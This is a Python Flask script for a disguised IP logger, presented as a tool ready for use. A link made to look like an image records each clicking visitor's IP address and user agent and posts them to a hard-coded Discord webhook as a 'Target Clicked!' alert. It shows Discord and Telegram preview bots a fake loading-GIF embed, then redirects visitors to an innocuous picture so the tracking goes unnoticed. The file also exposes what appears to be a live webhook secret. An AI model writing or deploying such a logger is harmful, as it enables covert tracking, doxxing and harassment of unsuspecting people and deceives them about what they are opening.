import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# YOUR WEBHOOK URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"

@app.route('/')
def home():
    return "Server is running."

@app.route('/view/image_01.png')
def logger():
    # 1. Grab the IP
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # 2. Send to Discord Webhook
    payload = {"content": f"🎯 **Target Clicked!**\nIP: `{user_ip}`\nUser-Agent: `{request.user_agent}`"}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    # 3. The Mask
    user_agent = request.user_agent.string.lower()
    if "discord" in user_agent or "telegram" in user_agent:
        # We send ONLY the GIF link in a way Discord's bot likes
        return '''
        <html>
            <head>
                <meta property="og:site_name" content=" ">
                <meta property="og:title" content=" ">
                <meta property="og:image" content="https://i.ibb.co/Lkv788Z/discord-loading.gif">
                <meta name="twitter:card" content="summary_large_image">
            </head>
            <body style="background-color: #36393f;"></body>
        </html>
        '''
    
    # 4. The Redirect
    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
